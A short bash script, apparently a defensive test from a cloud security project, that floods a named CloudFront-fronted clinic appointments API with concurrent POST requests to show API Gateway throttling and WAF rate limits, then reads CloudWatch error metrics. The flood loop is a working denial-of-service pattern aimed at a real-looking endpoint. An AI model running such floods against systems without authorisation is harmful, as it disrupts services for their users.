#!/usr/bin/env bash
# ============================================================
# ATTACK SCRIPT 5: Distributed-flood (DoS) against the API
# Target: Al-Kausar API via CloudFront edge
# Defense shown:
#   - API Gateway throttling (rate limit) returns 429/503 once
#     a client exceeds the allowed request rate
#   - WAF rate-based rule additionally caps per-IP requests
# ============================================================
set -u
BASE="https://d3sh4djt5tzbsr.cloudfront.net/api/appointments"
REQUESTS="${1:-60}"
CONCURRENCY="${2:-10}"
TOKEN="${AKMC_TOKEN:-}"

echo "============================================================"
echo "ATTACK 5: API flood ($REQUESTS requests, concurrency $CONCURRENCY)"
echo "Expect: some 200, then throttle responses (429/503) as the"
echo "        API Gateway rate limit protects the backend"
echo "============================================================"

ACC=""
if [ -n "$TOKEN" ]; then
  ACC="-H Authorization: Bearer ${TOKEN}"
fi

send_req() {
  curl -s -o /dev/null -w "%{http_code}\n" -X POST "$BASE" \
    -H "Content-Type: application/json" $ACC \
    --data '{"patientName":"Ali Raza","phone":"03180215568","doctor":"Dr. Ahmed Raza","speciality":"Cardiologist","room":"Room 101","date":"2026-09-10","slot":"10:00 AM","message":"flood test"}'
}
export -f send_req
export BASE ACC

seq 1 "$REQUESTS" | xargs -P "$CONCURRENCY" -I{} bash -c 'send_req' 2>/dev/null | sort | uniq -c

echo ""
echo "Status codes seen:"
echo "  200 = request processed normally"
echo "  401 = blocked by JWT authorizer (no/invalid token)"
echo "  429/503 = REJECTED by API Gateway throttling / WAF"
echo ""

# Verify API Gateway 4xx/5xx metrics afterwards
export PATH="$PATH:/home/hashir3000/awscli"
echo "=== API Gateway 5xx (throttling) metric, last 15 min ==="
aws cloudwatch get-metric-statistics --namespace AWS/ApiGateway --metric-name 5xx \
  --dimensions "Name=ApiId,Value=5wkbhqk1n9" "Name=Stage,Value=\$default" \
  --start-time "$(date -u -d '15 minutes ago' +%Y-%m-%dT%H:%M:%SZ)" \
  --end-time "$(date -u +%Y-%m-%dT%H:%M:%SZ)" --period 300 --statistics Sum --region ap-south-1 \
  --query 'Datapoints[].Sum' --output text | tr '\t' '\n' | sed 's/^/    5xx datapoint: /'